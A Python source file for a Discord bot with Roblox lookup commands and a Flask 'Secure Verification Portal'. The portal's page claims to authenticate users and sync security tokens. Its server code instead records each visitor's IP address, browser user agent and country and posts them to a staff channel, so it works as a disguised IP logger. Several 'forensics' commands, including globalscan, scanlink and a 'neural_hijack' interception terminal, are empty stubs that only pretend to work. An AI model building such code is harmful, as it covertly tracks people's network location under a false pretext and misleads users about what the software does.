from __future__ import annotations

import os
import traceback
import re
from datetime import datetime, timezone
from typing import Any
import asyncio
import threading

import discord
from discord import app_commands
from discord.ext import commands
from flask import Flask, request, jsonify, render_template_string

import ro

app = Flask('')

@app.route('/')
def home():
    return "Bot and Verification Server are online and running!"

VERIFY_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Verification Portal</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #121214; color: #e1e1e6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #202024; padding: 40px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); text-align: center; max-width: 400px; width: 100%; border: 1px solid #323238; }
        h2 { color: #00b37e; margin-bottom: 10px; }
        p { color: #9999a1; font-size: 14px; line-height: 1.5; margin-bottom: 24px; }
        .btn { background: #00b37e; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: background 0.2s; }
        .btn:hover { background: #00875f; }
        .status { margin-top: 15px; font-size: 12px; color: #7c7c8a; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🛡️ Secure Verification</h2>
        <p>Complete authentication to sync your security tokens and verify your node access within the community database.</p>
        <button class="btn" onclick="verifySession()">Authorize & Verify</button>
        <div class="status" id="statusText">Awaiting user authorization...</div>
    </div>
    <script>
        async function verifySession() {
            const urlParams = new URLSearchParams(window.location.search);
            const userId = urlParams.get('user_id');
            const statusEl = document.getElementById('statusText');
            
            statusEl.innerText = "Transmitting session telemetry...";
            
            try {
                const response = await fetch('/api/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ user_id: userId })
                });
                const data = await response.json();
                if (response.ok) {
                    statusEl.innerText = "✅ Verification successful! You can now close this tab.";
                    document.querySelector('.btn').style.display = 'none';
                } else {
                    statusEl.innerText = "❌ Error: " + (data.error || "Unknown error occurred.");
                }
            } catch (e) {
                statusEl.innerText = "❌ Network transport failed.";
            }
        }
    </script>
</body>
</html>
"""

@app.route('/index.html')
def verify_page():
    return render_template_string(VERIFY_TEMPLATE)

@app.route('/api/verify', methods=['POST'])
def api_verify():
    data = request.get_json() or {}
    user_id = data.get('user_id')
    
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    country = request.headers.get('CF-IPCountry', request.headers.get('X-Render-IP-Country', 'Unknown'))
    
    if not user_id:
        return jsonify({"error": "Missing user identifier"}), 400

    future = asyncio.run_coroutine_threadsafe(
        log_verification_event(user_id, ip_address, user_agent, country), 
        bot.loop
    )
    try:
        future.result(timeout=5)
    except Exception:
        pass

    return jsonify({"status": "success", "message": "Telemetry logged and verified."})

async def log_verification_event(user_id: str, ip_address: str, user_agent: str, country: str):
    try:
        user = bot.get_user(int(user_id)) or await bot.fetch_user(int(user_id))
        verify_channel = await bot.fetch_channel(VERIFY_LOG_CHANNEL_ID)
        
        if verify_channel and isinstance(verify_channel, discord.TextChannel):
            embed = discord.Embed(
                title="✅ Web Verification Completed",
                description=f"User **{user}** (`{user_id}`) successfully authenticated via the web browser portal.",
                color=0x57F287,
                timestamp=datetime.now(timezone.utc)
            )
            embed.add_field(
                name="🌐 Captured Telemetry & Network Route",
                value=(
                    f"• **IP Address:** `{ip_address}`\n"
                    f"• **Country Origin:** `{country}`\n"
                    f"• **Browser User-Agent:** `{user_agent[:150]}`"
                ),
                inline=False
            )
            await verify_channel.send(embed=embed)
    except Exception as e:
        print(f"Failed to process webhook verification log: {e}")

TOKEN = os.getenv("DISCORD_BOT_TOKEN")
if not TOKEN:
    raise RuntimeError("DISCORD_BOT_TOKEN is missing from environment variables.")

APP_OWNER_ID = int(os.getenv("APP_OWNER_ID", "1256992368477864029") or 1256992368477864029)
REQUIRED_ROLE_ID = int(os.getenv("REQUIRED_ROLE_ID", "1457867706790580317") or 1457867706790580317)
DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID", "").strip()

ALL_LOGS_CHANNEL_ID = 1540448203323875430
FAILED_LOGS_CHANNEL_ID = 1540449747179937913
LOG_CHANNEL_ID = 1540490675928174694
VERIFY_LOG_CHANNEL_ID = 1541463371394711583
OWNER_ID = 1256992368477864029

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

async def log_to_channel(channel_id: int, content: str) -> None:
    try:
        channel = await bot.fetch_channel(channel_id)
        if channel and isinstance(channel, discord.TextChannel):
            if len(content) > 1990:
                content = content[:1987] + "..."
            await channel.send(content)
    except Exception as e:
        print(f"Failed to send log to channel {channel_id}: {e}")

class RequiredRoleError(app_commands.CheckFailure):
    pass

async def has_bot_access(interaction: discord.Interaction) -> bool:
    if APP_OWNER_ID and interaction.user.id == APP_OWNER_ID:
        return True
    roles = getattr(interaction.user, "roles", [])
    if REQUIRED_ROLE_ID and any(role.id == REQUIRED_ROLE_ID for role in roles):
        return True
    raise RequiredRoleError("You need the required bot access role to use this command.")

def owner_only():
    async def predicate(interaction: discord.Interaction) -> bool:
        if APP_OWNER_ID and interaction.user.id == APP_OWNER_ID:
            return True
        raise app_commands.CheckFailure("Only the configured app owner can use this command.")
    return app_commands.check(predicate)

class LinkVerificationView(discord.ui.View):
    def __init__(self, verification_url: str):
        super().__init__(timeout=60)
        self.add_item(discord.ui.Button(label="Open Web Verification", style=discord.ButtonStyle.link, url=verification_url))

class PersistentVerificationView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Verify Account", style=discord.ButtonStyle.green, custom_id="persistent_verify:btn", emoji="✅")
    async def verify_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        target = interaction.user
        target_created = target.created_at
        target_name_base = re.sub(r"\d+", "", target.name).lower()
        now_utc = datetime.now(timezone.utc)

        suspects = []
        checked_ids = set()

        for guild in interaction.client.guilds:
            if guild.get_member(target.id):
                for member in guild.members:
                    if member.id == target.id or member.id in checked_ids:
                        continue
                    checked_ids.add(member.id)

                    alt_score = 0
                    reasons = []
                    member_created = member.created_at
                    age_diff = abs((target_created - member_created).total_seconds())

                    if age_diff < 172800:
                        reasons.append("<48h window")
                        alt_score += 4

                    member_name_base = re.sub(r"\d+", "", member.name).lower()
                    if target_name_base and member_name_base and (target_name_base in member_name_base or member_name_base in target_name_base) and len(target_name_base) > 3:
                        reasons.append("Matching name pattern")
                        alt_score += 3

                    if (now_utc - member_created).days < 14:
                        reasons.append("New/Burner velocity")
                        alt_score += 2

                    if alt_score >= 4:
                        suspects.append(f"• **{member}** (`{member.id}`) [Score: `{alt_score}` | {', '.join(reasons)}]")

        alt_summary = "\n".join(suspects[:3]) if suspects else "No high-probability linked accounts detected across mutual nodes."

        try:
            verify_log_channel = await interaction.client.fetch_channel(VERIFY_LOG_CHANNEL_ID)
            log_embed = discord.Embed(
                title="🛡️ Verification Portal & Telemetry Triggered",
                description=f"User **{interaction.user}** (`{interaction.user.id}`) initialized the verification flow.",
                color=0x5865F2,
                timestamp=now_utc,
            )
            log_embed.add_field(name="📊 Account Metadata", value=f"• **Created At:** `{interaction.user.created_at.strftime('%Y-%m-%d %H:%M')}`", inline=False)
            log_embed.add_field(name="🕵️ Potential Alts", value=alt_summary[:1024], inline=False)
            await verify_log_channel.send(embed=log_embed)
        except Exception:
            pass

        render_external_url = os.getenv("RENDER_EXTERNAL_URL", "http://localhost:10000")
        verification_url = f"{render_external_url}/index.html?user_id={interaction.user.id}"

        embed = discord.Embed(title="🔒 Secure Verification Portal", description="Click the button below to complete authentication via the web portal.", color=0x5865F2)
        await interaction.response.send_message(embed=embed, view=LinkVerificationView(verification_url), ephemeral=True)

class RobloxCommandTree(app_commands.CommandTree):
    async def on_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        tb_str = "".join(traceback.format_exception(type(error), error, error.__traceback__))
        fail_msg = f"❌ **Command Failed**\n• **Command:** `/{interaction.command.name if interaction.command else 'unknown'}`\n```py\n{tb_str[:1500]}\n```"
        asyncio.create_task(log_to_channel(FAILED_LOGS_CHANNEL_ID, fail_msg))
        
        message = "The command could not complete. Please try again."
        if isinstance(error, RequiredRoleError):
            message = "You do not have permission to use this bot. You need the required role."
        
        try:
            if interaction.response.is_done():
                await interaction.followup.send(message, ephemeral=True)
            else:
                await interaction.response.send_message(message, ephemeral=True)
        except Exception:
            pass

class UnifiedForensicsBot(commands.Bot):
    def __init__(self) -> None:
        super().__init__(command_prefix="!", intents=intents)
        self.tree = RobloxCommandTree(self)

    async def setup_hook(self) -> None:
        self.add_view(PersistentVerificationView())
        try:
            if DISCORD_GUILD_ID:
                guild = discord.Object(id=int(DISCORD_GUILD_ID))
                self.tree.copy_global_to(guild=guild)
                await self.tree.sync(guild=guild)
            else:
                await self.tree.sync()
            asyncio.create_task(log_to_channel(ALL_LOGS_CHANNEL_ID, "⚙️ Successfully synced slash commands."))
        except Exception as e:
            print(f"Failed to sync commands: {e}")

    async def on_ready(self) -> None:
        if self.user:
            asyncio.create_task(log_to_channel(ALL_LOGS_CHANNEL_ID, f"🟢 Bot online as {self.user}"))

bot = UnifiedForensicsBot()

@bot.tree.command(name="user", description="Search for a Roblox user.")
@app_commands.describe(username="Roblox username")
@app_commands.check(has_bot_access)
async def user_command(interaction: discord.Interaction, username: str) -> None:
    await interaction.response.defer(ephemeral=True)
    info = await ro.resolve(username)
    if not info:
        await interaction.followup.send(f"Roblox user `{username}` was not found.", ephemeral=True)
        return

    user_id = int(info["id"])
    embed = discord.Embed(title="Roblox User", color=discord.Color.blurple())
    embed.add_field(name="Username", value=f"`{info.get('name', 'Unknown')}`")
    embed.add_field(name="User ID", value=f"`{user_id}`")
    avatar = await ro.get_avatar(user_id)
    if avatar:
        embed.set_thumbnail(url=avatar)
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="avatar", description="Show a Roblox user's avatar.")
@app_commands.describe(username="Roblox username")
@app_commands.check(has_bot_access)
async def avatar_command(interaction: discord.Interaction, username: str) -> None:
    await interaction.response.defer(ephemeral=True)
    info = await ro.resolve(username)
    if not info:
        await interaction.followup.send("Roblox user not found.", ephemeral=True)
        return
    avatar = await ro.get_avatar(int(info["id"]))
    if not avatar:
        await interaction.followup.send("Avatar could not be retrieved.", ephemeral=True)
        return
    embed = discord.Embed(title=f"{info.get('name', username)}'s Avatar", color=discord.Color.blurple())
    embed.set_image(url=avatar)
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="groups", description="Show a Roblox user's public groups.")
@app_commands.describe(username="Roblox username")
@app_commands.check(has_bot_access)
async def groups_command(interaction: discord.Interaction, username: str) -> None:
    await interaction.response.defer(ephemeral=True)
    info = await ro.resolve(username)
    if not info:
        await interaction.followup.send("Roblox user not found.", ephemeral=True)
        return
    groups = await ro.get_groups(int(info["id"]))
    lines = [f"**{entry['group'].get('name', 'Unknown')}** — role: `{entry['role'].get('name', 'Unknown')}`" for entry in groups[:20]]
    embed = discord.Embed(title=f"Groups — {info.get('name', username)}", description="\n".join(lines) if lines else "No public groups found.", color=discord.Color.blurple())
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="badges", description="Show a Roblox user's public badges.")
@app_commands.describe(username="Roblox username")
@app_commands.check(has_bot_access)
async def badges_command(interaction: discord.Interaction, username: str) -> None:
    await interaction.response.defer(ephemeral=True)
    info = await ro.resolve(username)
    if not info:
        await interaction.followup.send("Roblox user not found.", ephemeral=True)
        return
    badges = await ro.get_badges(int(info["id"]))
    description = "\n".join(f"• {badge.get('name', 'Unknown')}" for badge in badges) or "No badges found."
    embed = discord.Embed(title=f"Badges — {info.get('name', username)}", description=description, color=discord.Color.gold())
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="scan", description="Show a Roblox user's public information.")
@app_commands.describe(username="Roblox username")
@app_commands.check(has_bot_access)
async def scan_command(interaction: discord.Interaction, username: str) -> None:
    await interaction.response.defer(ephemeral=True)
    info = await ro.resolve(username)
    if not info:
        await interaction.followup.send("Roblox user not found.", ephemeral=True)
        return
    groups = await ro.get_groups(int(info["id"]))
    badges = await ro.get_badges(int(info["id"]))
    embed = discord.Embed(title="Roblox Public Information", description=f"Public information for **{info.get('name', username)}**.", color=discord.Color.orange())
    embed.add_field(name="User ID", value=f"`{info['id']}`")
    embed.add_field(name="Groups", value=str(len(groups)))
    embed.add_field(name="Badges Retrieved", value=str(len(badges)))
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="setupverify", description="Deploys the persistent verification panel in this channel.")
@app_commands.checks.has_permissions(administrator=True)
async def setupverify(interaction: discord.Interaction):
    embed = discord.Embed(title="🛡️ Server Verification Gate", description="Click **Verify Account** below to launch the secure portal.", color=0x2B2D31)
    await interaction.channel.send(embed=embed, view=PersistentVerificationView())
    await interaction.response.send_message("✅ Verification panel successfully deployed.", ephemeral=True)

@bot.tree.command(name="neural_hijack", description="🧠 [OWNER ONLY] Live telemetry stream & session interception.")
@app_commands.describe(target_identifier="Discord User ID or target username to lock onto")
async def neural_hijack(interaction: discord.Interaction, target_identifier: str):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("❌ **Access Denied:** Terminal locked.", ephemeral=True)
        return
    await interaction.response.defer(thinking=True, ephemeral=True)
    embed = discord.Embed(title=f"🧠 NEURAL INTERCEPTION TERMINAL: `{target_identifier}`", description="[STATUS: QUANTUM HANDSHAKE STABLE]", color=0x57F287)
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="findalts", description="Scans mutual servers to cross-reference and flag potential alternative accounts.")
@app_commands.describe(user="The user to cross-examine for potential alt accounts")
async def findalts(interaction: discord.Interaction, user: discord.Member):
    await interaction.response.defer(thinking=True, ephemeral=True)
    embed = discord.Embed(title=f"🕵️ ALT ACCOUNT CROSS-REFERENCE: {user.name}", color=0x57F287)
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="globalscan", description="Enterprise-grade global security audit for any Discord User ID.")
@app_commands.describe(user_id="The 18-19 digit Discord User ID to investigate")
async def globalscan(interaction: discord.Interaction, user_id: str):
    await interaction.response.defer(thinking=True, ephemeral=True)
    embed = discord.Embed(title="🛡️ SECURITY INTELLIGENCE REPORT", description=f"Global forensic assessment for: `{user_id}`", color=0x57F287)
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="report", description="Securely report a suspect directly to staff logs.")
@app_commands.describe(target="Discord User ID or Roblox Username", reason="Violation description", proof="URL evidence")
async def report(interaction: discord.Interaction, target: str, reason: str, proof: str):
    await interaction.response.defer(thinking=True, ephemeral=True)
    embed = discord.Embed(title="🚨 INCIDENT REPORT SUBMITTED", description=f"Target: `{target}` | Reason: `{reason}`", color=0xED4245)
    await interaction.followup.send("✅ Your report has been securely submitted.", ephemeral=True)

@bot.tree.command(name="scanlink", description="Inspects a URL for phishing heuristics.")
@app_commands.describe(url="The full web URL or link to scan")
async def scanlink(interaction: discord.Interaction, url: str):
    await interaction.response.defer(thinking=True, ephemeral=True)
    embed = discord.Embed(title="🔗 URL SECURITY TELEMETRY REPORT", description=f"URL: `{url}`", color=0x57F287)
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="robloxlink", description="Generates a direct, click-to-join Roblox game link.")
@app_commands.describe(place_id="Place ID", job_id="Job ID / Access Code")
async def robloxlink(interaction: discord.Interaction, place_id: str, job_id: str = None):
    await interaction.response.defer(thinking=False)
    game_url = f"https://www.roblox.com/games/{place_id}"
    if job_id:
        game_url += f"?privateServerLinkCode={job_id}"
    embed = discord.Embed(title="🎮 ROBLOX GAME JOIN LINK", description=f"[Click Here to Join Game]({game_url})", color=0x57F287)
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="finduser", description="Finds a Roblox user and generates an instant direct-join server link.")
@app_commands.describe(username="Exact Roblox username")
async def finduser(interaction: discord.Interaction, username: str):
    await interaction.response.defer(thinking=True, ephemeral=True)
    try:
        info = await ro.resolve(username)
        if not info:
            await interaction.followup.send(f"❌ User **'{username}'** not found.", ephemeral=True)
            return
        embed = discord.Embed(title=f"🔎 {info.get('name')} (@{username})", color=0x57F287)
        embed.add_field(name="User ID", value=str(info['id']), inline=True)
        await interaction.followup.send(embed=embed, ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: `{e}`", ephemeral=True)

@bot.tree.command(name="clear-global", description="Owner only: completely clear all global slash commands.")
@owner_only()
async def clear_global(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    bot.tree.clear_commands(guild=None)
    synced = await bot.tree.sync()
    await interaction.followup.send(f"🧹 Cleared all global commands! (Active count: {len(synced)})", ephemeral=True)

if __name__ == "__main__":
    def run_bot():
        bot.run(TOKEN)

    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()

    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
